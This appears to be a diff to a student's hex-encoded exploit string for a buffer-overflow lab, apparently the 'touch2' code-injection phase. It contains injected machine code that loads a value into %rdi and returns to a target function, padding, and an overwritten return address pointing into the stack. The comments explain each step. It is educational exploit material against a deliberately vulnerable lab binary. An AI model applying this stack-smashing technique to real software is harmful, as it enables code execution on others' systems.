@@ -1,5 +1,5 @@
 48 c7 c7 78 43 27 2d  /* mov    $0x2d274378,%rdi */
-68 e1 18 40 00        /* pushq  $0x4018e1 */
+68 e1 18 40 00        /* pushq  $0x4018e1 // push the address for touch2 to stack to execute that next */
 c3                    /* retq */
 
                00 00 00
@@ -8,4 +8,3 @@ c3                    /* retq */
 00 00 00 00 00 00 00 00
 
 88 e5 67 55 00 00 00 00 /* go to rsp register to execute code from there */ 
-e1 18 40 00 00 00 00 00 /* go to touch2 to execute code there */
